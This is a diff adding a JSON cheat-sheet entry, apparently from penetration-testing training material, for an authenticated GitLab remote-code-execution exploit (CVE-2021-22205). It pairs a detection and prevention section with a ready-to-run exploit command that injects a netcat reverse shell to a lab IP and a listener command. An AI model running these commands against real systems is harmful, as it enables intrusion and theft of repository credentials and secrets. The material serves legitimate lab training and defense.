@@ -1,0 +1,84 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "python"
+  ],
+  "tags": [
+    "gitlab",
+    "rce",
+    "cve"
+  ],
+  "category": "Exploitation",
+  "subcategory": "GitLab",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Authenticated RCE (CVE-2021-22205 chain) firing a reverse shell",
+      "command": "python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.198 8443 >/tmp/f'"
+    },
+    {
+      "label": "Catch the shell on a listener",
+      "command": "nc -lnvp 8443"
+    }
+  ],
+  "notes": "CVE-2021-22205 (ExifTool/DjVu) hits older GitLab; some versions need a low-priv authenticated user, hence the userenum step. Fires a reverse shell directly - have a listener ready.",
+  "references": [
+    {
+      "title": "GitLab CVE-2021-22205",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gitlab-userenum",
+      "note": "Supplies the valid account this exploit authenticates with.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "gitlab-rce",
+  "name": "GitLab - Authenticated RCE (CVE-2021-22205)",
+  "command": "python3 gitlab_13_10_2_rce.py -t http://<url>:8081 -u <user> -p <password> -c '<reverse_shell>'",
+  "description": "Exploits the ExifTool/DjVu flaw (CVE-2021-22205) in GitLab to run commands. Provide a reverse-shell command and catch it with netcat. Some versions are unauthenticated.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "CVE-2021-22205 exploits an ExifTool RCE vulnerability in GitLab's file upload processing. GitLab passes uploaded images to ExifTool for metadata processing; a crafted DjVu file with malicious metadata triggers arbitrary command execution on the GitLab server.",
+    "prerequisites": "GitLab CE/EE 11.9-13.10.2. Ability to upload files. ExifTool version < 12.24.",
+    "impact": "RCE as the git user on the GitLab server. Access to all repositories, CI/CD credentials, and the GitLab database containing secrets and tokens.",
+    "detection": "Upload of a DjVu file to GitLab. ExifTool process spawning child commands. Outbound network from git user. SIEM alert for CVE-2021-22205 payload signature.",
+    "artifacts": "GitLab application log (file upload triggering ExifTool) | Network flow: git user -> attacker reverse shell | EDR: unexpected child process from exiftool",
+    "prevention": "Update GitLab to 13.10.3+ and ExifTool to 12.24+. Restrict outbound network from GitLab server. Monitor ExifTool for unexpected child process creation.",
+    "misconfiguration": "GitLab running unpatched ExifTool (< 12.24) with no network egress controls on the server.",
+    "vulnerable_config": "# GitLab < 13.10.3 + ExifTool < 12.24\n# ExifTool processes DjVu metadata including shell metacharacters\n# No egress filtering on GitLab server",
+    "secure_config": "# Update GitLab\ngitlab-ctl upgrade\n# Update ExifTool\napt-get install --only-upgrade libimage-exiftool-perl\n# Restrict git user outbound\niptables -A OUTPUT -u git -j DROP",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "OWASP A06:2021"
+    ]
+  }
+}
